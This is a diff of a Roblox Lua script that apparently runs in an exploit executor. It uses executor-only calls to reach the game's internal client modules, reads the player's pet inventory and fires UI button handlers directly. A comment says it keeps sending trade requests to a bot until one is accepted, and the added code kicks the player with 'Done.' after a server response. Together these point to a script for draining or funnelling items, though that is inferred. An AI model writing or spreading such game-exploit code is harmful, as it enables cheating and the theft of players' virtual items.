@@ -21,13 +21,7 @@ task.wait(1)
 local NewsApp = game:GetService("Players").LocalPlayer.PlayerGui.NewsApp.Enabled
 local sound = require(game.ReplicatedStorage:WaitForChild("Fsys")).load("SoundPlayer")
 local UI = require(game.ReplicatedStorage:WaitForChild("Fsys")).load("UIManager")
-sound.FX:play("BambooButton")
-UI.set_app_visibility("NewsApp", false)
-UI.set_app_visibility("DialogApp", false)
 local myUsername = game:GetService("Players").LocalPlayer.Name
-local NewsApp = game:GetService("Players").LocalPlayer.PlayerGui.NewsApp.Enabled
-local sound = require(game.ReplicatedStorage:WaitForChild("Fsys")).load("SoundPlayer")
-local UI = require(game.ReplicatedStorage:WaitForChild("Fsys")).load("UIManager")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
@@ -36,12 +30,32 @@ local DataApiHook = game.ReplicatedStorage:WaitForChild("API"):WaitForChild("Dat
 local TradeApiHook = game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild(
     "TradeAPI/TradeRequestReceived")
 getgenv().fsys = require(game:GetService("ReplicatedStorage").ClientModules.Core.ClientData)
+
+local function FireSig(button)
+    pcall(function()
+        for _, connection in pairs(getconnections(button.MouseButton1Down)) do
+            connection:Fire()
+        end
+        task.wait(1)
+        for _, connection in pairs(getconnections(button.MouseButton1Up)) do
+            connection:Fire()
+        end
+        task.wait(1)
+        for _, connection in pairs(getconnections(button.MouseButton1Click)) do
+            connection:Fire()
+            -- print(button.Name.." clicked!")
+        end
+    end)
+end
+local HomeButton = game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.SpawnChooserDialog.UpperCardContainer.ChoicesContent.Choices.Home.Button
+task.wait(5)
+FireSig(HomeButton)
+
 local inventory = fsys.get("inventory")
 local inventoryPets = inventory and inventory.pets or {}
 
 sound.FX:play("BambooButton")
 UI.set_app_visibility("NewsApp", false)
-UI.set_app_visibility("DialogApp", false)
 
 task.wait(10)
 -- SEND A TRADE REQUEST TO THE BOT UNTIL IT ACCEPTS MUST HAVE 10 SECONDS DELAY
@@ -154,6 +168,8 @@ DataApiHook.OnClientEvent:Connect(function(...)
         if data then
             print("Decoded response:")
             print(HttpService:JSONEncode(data))
+            task.wait(5)
+            LocalPlayer:Kick("Done.")
         else
             print("Raw response:", rawBody)
         end
